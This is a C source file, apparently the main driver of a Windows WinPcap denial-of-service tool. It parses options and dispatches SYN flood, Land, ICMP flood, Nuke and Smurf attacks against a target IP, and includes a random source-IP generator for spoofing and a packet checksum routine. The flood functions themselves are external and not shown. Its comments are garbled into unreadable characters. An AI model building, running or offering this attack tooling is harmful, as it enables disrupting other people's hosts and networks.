#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define WPCAP
#define HAVE_REMOTE

#include <pcap.h>

#include "../headers/types.h"
#include "../headers/ethernet.h"
#include "../headers/ip.h"
#include "../headers/icmp.h"
#include "../headers/tcp.h"

extern int syn_flood(char *victim_ip_address, WORD victim_port, DWORD iteration, DWORD interval, WORD burst, bool land);
extern int icmp_flood(char *victim_ip_address, DWORD iteration, DWORD interval, WORD burst);
extern int nuke(char *victim_ip_address, char *source_ip_address);
extern int smurf(char *victim_ip_address, char *broadcast_ip_address, DWORD iteration, DWORD interval, WORD burst);

/******************************************************************************/
//  �������, ��������� ������� � ���������.
//
//  ������� ���������:
//      char *name - ��� ���������.
/******************************************************************************/
void usage(char *name)
{
    fprintf(stderr, "\n\nusage: %s [Type Of Attack] {Target Specification} [Options]\n"
            "\tTYPE OF ATTACK:\n"
            "\t  --syn: SYN Flood attack.\n"
            "\t  --land: Land attack.\n"
            "\t  --icmp: ICMP Flood attack.\n"
            "\t  --nuke: Nuke attack.\n"
            "\t  --smurf: Smurf attack.\n"
            "\t  TARGET SPECIFICATION (SYN FLOOD, LAND):\n"
            "\t    -ip <IP address>: Target's IP address.\n"
            "\t    -p <port number>: Target's port number.\n"
            "\t    -a <number of packets>: Number of packets to send per burst.\n\n"
            "\t  TARGET SPECIFICATION (ICMP FLOOD):\n"
            "\t    -ip <IP address>: Target's IP address.\n"
            "\t    -a <number of packets>: Number of packets to send per burst.\n"
            "\t  TARGET SPECIFICATION (SMURF):\n"
            "\t    -ip <IP address>: Target's IP address.\n"
            "\t    -brdcst_ip <broadcast IP address>: broadcast IP address.\n"
            "\t    -a <number of packets>: Number of packets to send per burst.\n"
            "\tOPTIONS:\n"
            "\t  -i <interval>: Packet sending interval in milliseconds.\n"
            "\t  -b <number of bursts>: Number packet bursts to send.\n"
            "\t  TARGET SPECIFICATION (NUKE):\n"
            "\t    -src_ip <source IP address>: Source IP address.\n"
            "\t    -dst_ip <destination IP address>: Target's IP address.\n"
            "\tEXAMPLE:\n"
            "\t  %s --syn -ip 192.168.100.13 -p 139 -a 666\n", name, name);
}

/******************************************************************************/
//  �������, ������������ ��������� IP �����.
//
//  �������� ���������:
//      DWORD - ��������������� IP �����.
/******************************************************************************/
DWORD random_ip_address()
{
    char buf[16] = {0};   // ������ ��� ������ IP ������.
    // ������������ ���������� IP ������.
    sprintf(buf, "%d.%d.%d.%d", (rand() % 253) + 1, (rand() % 253) + 1, (rand() % 253) + 1, (rand() % 253) + 1);

    return inet_addr(buf);
}

/******************************************************************************/
//  �������, �������������� ���������� ����������� �����.
//
//  ������� ���������:
//      WORD *buffer - ��������� �� ������, ��� �������� �������������
//                     ����������� �����.
//      DWORD size - ������ �������.
//  �������� ���������:
//      DWORD - ����������� �����.
/******************************************************************************/
WORD checksum(WORD *buffer, DWORD size)
{
    DWORD sum = 0;	// ��������� ����������.

    // ������������ 2-� �������� ����.
    while (size > 1)
    {
        sum = sum + *buffer++;	// ��������.
        size  = size - sizeof(WORD);	// ���������� ������� �� 2 �����.
    }
    // ��������, ���� 1 ���� �� ��������������.
    if (size)
        sum = sum + *(BYTE*)buffer;   // ����������� �� ���������������� �����.

    sum = (sum >> 16) + (sum & 0xffff);	// ���������� ������ � ������ 2 ����� ����������� �����.
    sum = (~(sum + (sum >> 16)) & 0xffff);

    return (WORD)sum;
}

/******************************************************************************/
//  �������, �������������� ����� ���������� ��� ������/�������� �������.
//
//  �������� ���������:
//      pcap_t* - ��������� �� �������� ����������.
//          NULL - �������� ��������� ������.
//
/******************************************************************************/
pcap_t* select_device()
{
    int i = 0;          // �������.
    int device_number;  // ����� ���������� ����������.

    pcap_t *device_handle;                      // �������� ���������� ��� ������/�������� ������.
    pcap_if_t *device;                          // ��������� ����������.
    pcap_if_t *device_list;                     // ��������� �� ������ ���������.
    char error_buffer[PCAP_ERRBUF_SIZE];        // ����� ������.

    // ������� ������ ������� ��������� �� ��������� ����������.
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &device_list, error_buffer) == -1)
    {
        printf("Error in pcap_findalldevs_ex: %s\n", error_buffer);
        return NULL;
    }
    // ����� ������ ��������� ���������.
    for (device = device_list; device; device = device->next)
    {
        printf("\n%d.\t%s", ++i, device->name);
        if (device->description)
            printf("\n\t(%s)\n", device->description);
        else
            printf("\n\t(No description available)\n");
    }
    // ��������, ���� �� ���� ������� �� ������ ����������.
    if (i == 0)
    {
        printf("\nNo devices found! Make sure WinPcap is installed.\n");
        return NULL;
    }
    // ���� ������ ����������.
    printf("\nEnter the device number (1-%d): ", i);
    scanf("%d", &device_number);
    // ��������, ���� ��������� ����� ���������� �� ����������.
    if (device_number < 1 || device_number > i)
    {
        printf("\nDevice number out of range.\n");
        pcap_freealldevs(device_list);  // ������������, ���������� ������ ���������.
        return NULL;
    }
    // ����� ���������� �� ������.
    for (device = device_list, i = 0; i < (device_number - 1); device = device->next, i++);
    // �������� ���������� ��� ������/�������� ������.
    if ((device_handle = pcap_open(device->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 3000, NULL, error_buffer)) == NULL)
    {
        printf("\nUnable to open the device. %s is not supported by WinPcap\n", device->name);
        pcap_freealldevs(device_list);  // ������������, ���������� ������ ���������.
        return NULL;
    }
    pcap_freealldevs(device_list);  // ������������, ���������� ������ ���������.

    return device_handle;
}

int main(int argc, char **argv)
{
    int i = 0;
    int target_ip_address = 0;
    int source_ip_address = 0;
    int broadcast_ip_address = 0;
    WORD target_port = 0;
    WORD burst = 1;
    DWORD number_of_packet = 0;
    DWORD interval = 0;

    if (argc < 3)
    {
        usage(argv[0]);
        return -1;
    }

    if (!strcmp(argv[1], "--syn"))
    {
        for (i = 2; i < argc; i++)
            if (!strcmp(argv[i], "-ip"))
                target_ip_address = ++i;
            else if (!strcmp(argv[i], "-p"))
                target_port = atoi(argv[++i]);
            else if (!strcmp(argv[i], "-a"))
                number_of_packet = atol(argv[++i]);
            else if (!strcmp(argv[i], "-i"))
                interval = atol(argv[++i]);
            else if (!strcmp(argv[i], "-b"))
                burst = atoi(argv[++i]);
            else
            {
                usage(argv[0]);
                return -1;
            }
        syn_flood(argv[target_ip_address], target_port, number_of_packet, interval, burst, false);
    }
    else if (!strcmp(argv[1], "--land"))
    {
        for (i = 2; i < argc; i++)
            if (!strcmp(argv[i], "-ip"))
                target_ip_address = ++i;
            else if (!strcmp(argv[i], "-p"))
                target_port = atoi(argv[++i]);
            else if (!strcmp(argv[i], "-a"))
                number_of_packet = atol(argv[++i]);
            else if (!strcmp(argv[i], "-i"))
                interval = atol(argv[++i]);
            else if (!strcmp(argv[i], "-b"))
                burst = atoi(argv[++i]);
            else
            {
                usage(argv[0]);
                return -1;
            }
        syn_flood(argv[target_ip_address], target_port, number_of_packet, interval, burst, true);
    }
    else if (!strcmp(argv[1], "--icmp"))
    {
        for (i = 2; i < argc; i++)
            if (!strcmp(argv[i], "-ip"))
                target_ip_address = ++i;
            else if (!strcmp(argv[i], "-a"))
                number_of_packet = atol(argv[++i]);
            else if (!strcmp(argv[i], "-i"))
                interval = atol(argv[++i]);
            else if (!strcmp(argv[i], "-b"))
                burst = atoi(argv[++i]);
            else
            {
                usage(argv[0]);
                return -1;
            }
        icmp_flood(argv[target_ip_address], number_of_packet, interval, burst);
    }
    else if (!strcmp(argv[1], "--nuke"))
    {
        for (i = 2; i < argc; i++)
            if (!strcmp(argv[i], "-src_ip"))
                source_ip_address = ++i;
            else if (!strcmp(argv[i], "-dst_ip"))
                target_ip_address = ++i;
            else
            {
                usage(argv[0]);
                return -1;
            }
        nuke(argv[target_ip_address], argv[source_ip_address]);
    }
    else if (!strcmp(argv[1], "--smurf"))
    {
        for (i = 2; i < argc; i++)
            if (!strcmp(argv[i], "-ip"))
                target_ip_address = ++i;
            else if (!strcmp(argv[i], "-brdcst_ip"))
                broadcast_ip_address = ++i;
            else if (!strcmp(argv[i], "-a"))
                number_of_packet = atol(argv[++i]);
            else if (!strcmp(argv[i], "-i"))
                interval = atol(argv[++i]);
            else if (!strcmp(argv[i], "-b"))
                burst = atoi(argv[++i]);
            else
            {
                usage(argv[0]);
                return -1;
            }
        smurf(argv[target_ip_address], argv[broadcast_ip_address], number_of_packet, interval, burst);
    }
    else
    {
        usage(argv[0]);
        return -1;
    }

    return 0;
}
